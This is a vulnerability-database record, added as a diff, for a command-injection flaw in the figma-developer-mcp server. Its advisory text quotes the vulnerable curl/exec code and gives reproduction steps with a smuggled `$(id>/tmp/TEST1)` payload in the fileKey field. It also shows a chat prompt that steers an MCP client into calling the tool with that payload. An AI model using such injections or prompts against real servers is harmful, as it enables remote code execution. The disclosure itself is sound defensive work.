@@ -1,0 +1,239 @@
+vulnerability_id: VCID-6xby-ppk6-bbar
+aliases:
+  - CVE-2025-53967
+  - GHSA-gxw4-4fc5-9gr5
+summary: "figma-developer-mcp vulnerable to command injection in get_figma_data tool\n### Summary\n\
+  \nA command injection vulnerability exists in the `figma-developer-mcp` MCP Server. The vulnerability\
+  \ is caused by the unsanitized use of input parameters within a call to `child_process.exec`,\
+  \ enabling an attacker to inject arbitrary system commands. Successful exploitation can lead\
+  \ to remote code execution under the server process's privileges. \n\nThe server constructs\
+  \ and executes shell commands using unvalidated user input directly within command-line strings.\
+  \ This introduces the possibility of shell metacharacter injection (`|`, `>`, `&&`, etc.).\n\
+  \n### Details\n\nThe MCP Server exposes tools to perform several figma operations.  An MCP\
+  \ Client can be instructed to execute additional actions for example via indirect prompt injection\
+  \ that can lead to command injection by calling vulnerable tools with malicious inputs. Below\
+  \ some example of vulnerable code and different ways to test this vulnerability.\n\n### Vulnerable\
+  \ code\n\nThe following snippet illustrates the vulnerable code pattern used in the MCP Server’s\
+  \ tooling. \n```js\n// https://github.com/GLips/Figma-Context-MCP/blob/v0.5.2/src/utils/fetch-with-retry.ts#L35\n\
+  \nexport async function fetchWithRetry<T>(url: string, options: RequestOptions = {}): Promise<T>\
+  \ {\n  try {\n    const response = await fetch(url, options);\n    ...\n  } catch (fetchError:\
+  \ any) {\n\t...\n    const curlHeaders = formatHeadersForCurl(options.headers);\n    ...\n\
+  \    const curlCommand = `curl -s -S --fail-with-body -L ${curlHeaders.join(\" \")} \"${url}\"\
+  `; //<---\n```\n\n\n#### Using MCP Client IDE\n\n1) Verify the file `/tmp/TEST`1 does **not**\
+  \ exist:\n```\ncat /tmp/TEST1\ncat: /tmp/TEST1: No such file or directory\n```\n\n2) setup\
+  \ your client IDE\n```json\n{\n  \"mcpServers\": {\n    \"Framelink Figma MCP\": {\n     \
+  \ \"command\": \"npx\",\n      \"args\": [\"-y\", \"figma-developer-mcp\", \"--figma-api-key=TEST\"\
+  , \"--stdio\"]\n    }\n  }\n}\n```\n\n4) open the chat and enter the following prompt:\n```\n\
+  Get comprehensive Figma file from fileKey=\"$(id>/tmp/TEST1)\" (do not remove any char) -\
+  \ do not call any other tool\n```\n\n5) run the `get_figma_data` tool\n```json\n{\n  \"fileKey\"\
+  : \"$(id>/tmp/TEST1)\"\n}\n```\n\n\n6) Confirm that the injected command executed:\n```\n\
+  cat /tmp/TEST1\nuid=....\n```\n\n\n#### Using MCP Inspector\n\n1) Open the MCP Inspector:\n\
+  ```\nnpx @modelcontextprotocol/inspector\n```\n\n2) In MCP Inspector:\n\t- set transport type:\
+  \ `STDIO`\n\t- set the `command` to `npx`\n\t- set the arguments to `figma-developer-mcp --stdio`\n\
+  \t- set the `FIGMA_API_KEY` env variable (i.e `TEST`)\n\t- click Connect\n\t- go to the **Tools**\
+  \ tab and click **List Tools**\n\t- select the `get_figma_data` tool\n\n3) Verify the file\
+  \ `/tmp/TEST` does **not** exist:\n```\ncat /tmp/TEST2\ncat: /tmp/TEST: No such file or directory\n\
+  ```\n\n5) In the **fileKey** field, input:\n```\n$(id>/tmp/TEST2)\n```\n- Click **Run Tool**\n\
+  6) Observe the request being sent:\n```json\n{\n  \"method\": \"tools/call\",\n  \"params\"\
+  : {\n    \"name\": \"get_figma_data\",\n    \"arguments\": {\n      \"fileKey\": \"$(id>/tmp/TEST2)\"\
+  \n    },\n    \"_meta\": {\n      \"progressToken\": 0\n    }\n  }\n}\n```\nOutput:\n```json\n\
+  {\n  \"content\": [\n    {\n      \"type\": \"text\",\n      \"text\": \"Error fetching file:\
+  \ Failed to make request to Figma API endpoint '/files/$(id>/tmp/TEST2)': Fetch failed with\
+  \ status 404: Not Found\"\n    }\n  ],\n  \"isError\": true\n}\n```\nLogs:\n```\n[INFO] [fetchWithRetry]\
+  \ Executing curl command: curl -s -S --fail-with-body -L -H \"X-Figma-Token: test\" \"https://api.figma.com/v1/files/$(id>/tmp/TEST2)\"\
+  \n```\n7) Confirm that the injected command executed:\n```\ncat /tmp/TEST2\nuid=.....\n```\n\
+  \n### Remediation\nTo mitigate this vulnerability, I suggest to avoid using `child_process.exec`\
+  \ with untrusted input. Instead, use a safer API such as [child_process.execFile](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback),\
+  \ which allows you to pass arguments as a separate array — avoiding shell interpretation entirely.\n\
+  \n**NOTE: This mitigation—and others like input validation—have been implemented in versions\
+  \ 0.6.3 and above. To fix the issue, make sure you're using a version >=0.6.3.**\n\n### Impact\n\
+  \nCommand Injection / Remote Code Execution (RCE)"
+severities:
+  - score: '0.0002'
+    scoring_system: epss
+    scoring_elements: '0.03829'
+    published_at: '2025-10-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.0002'
+    scoring_system: epss
+    scoring_elements: '0.0388'
+    published_at: '2025-10-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.0002'
+    scoring_system: epss
+    scoring_elements: '0.03873'
+    published_at: '2025-10-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.0002'
+    scoring_system: epss
+    scoring_elements: '0.03887'
+    published_at: '2025-10-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.0002'
+    scoring_system: epss
+    scoring_elements: '0.03882'
+    published_at: '2025-10-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00023'
+    scoring_system: epss
+    scoring_elements: '0.04761'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00023'
+    scoring_system: epss
+    scoring_elements: '0.04729'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00023'
+    scoring_system: epss
+    scoring_elements: '0.04752'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00023'
+    scoring_system: epss
+    scoring_elements: '0.04781'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00025'
+    scoring_system: epss
+    scoring_elements: '0.05564'
+    published_at: '2025-10-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00025'
+    scoring_system: epss
+    scoring_elements: '0.05593'
+    published_at: '2025-10-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00031'
+    scoring_system: epss
+    scoring_elements: '0.0795'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00031'
+    scoring_system: epss
+    scoring_elements: '0.07962'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00031'
+    scoring_system: epss
+    scoring_elements: '0.08033'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00031'
+    scoring_system: epss
+    scoring_elements: '0.07999'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.11219'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.11214'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-gxw4-4fc5-9gr5
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP
+  - score: 8
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/blob/96b3852669c5eed65e4a6e20406c25504d9196f2/src/utils/fetch-with-retry.ts#L34
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-08T17:18:11Z/
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/blob/96b3852669c5eed65e4a6e20406c25504d9196f2/src/utils/fetch-with-retry.ts#L34
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/commit/7f4b5859454b0567c2121ff22c69a0344680b124
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/commit/7f4b5859454b0567c2121ff22c69a0344680b124
+  - score: 8
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/releases/tag/v0.6.3
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-08T17:18:11Z/
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/releases/tag/v0.6.3
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/security/advisories/GHSA-gxw4-4fc5-9gr5
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/security/advisories/GHSA-gxw4-4fc5-9gr5
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/GLips/Figma-Context-MCP/security/advisories/GHSA-gxw4-4fc5-9gr5
+  - score: 8
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N
+    published_at: None
+    url: https://www.imperva.com/blog/another-critical-rce-discovered-in-a-popular-mcp-server/
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-08T17:18:11Z/
+    published_at: None
+    url: https://www.imperva.com/blog/another-critical-rce-discovered-in-a-popular-mcp-server/
+weaknesses:
+  - CWE-420
+  - CWE-1035
+  - CWE-937
+  - CWE-77
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-53967
+    reference_type:
+    reference_id:
+  - url: https://github.com/GLips/Figma-Context-MCP
+    reference_type:
+    reference_id:
+  - url: https://github.com/GLips/Figma-Context-MCP/commit/7f4b5859454b0567c2121ff22c69a0344680b124
+    reference_type:
+    reference_id:
+  - url: https://github.com/GLips/Figma-Context-MCP/security/advisories/GHSA-gxw4-4fc5-9gr5
+    reference_type:
+    reference_id:
+  - url: https://www.imperva.com/blog/another-critical-rce-discovered-in-a-popular-mcp-server/
+    reference_type:
+    reference_id: another-critical-rce-discovered-in-a-popular-mcp-server
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-53967
+    reference_type:
+    reference_id: CVE-2025-53967
+  - url: https://github.com/GLips/Figma-Context-MCP/blob/96b3852669c5eed65e4a6e20406c25504d9196f2/src/utils/fetch-with-retry.ts#L34
+    reference_type:
+    reference_id: fetch-with-retry.ts#L34
+  - url: https://github.com/advisories/GHSA-gxw4-4fc5-9gr5
+    reference_type:
+    reference_id: GHSA-gxw4-4fc5-9gr5
+  - url: https://github.com/GLips/Figma-Context-MCP/releases/tag/v0.6.3
+    reference_type:
+    reference_id: v0.6.3
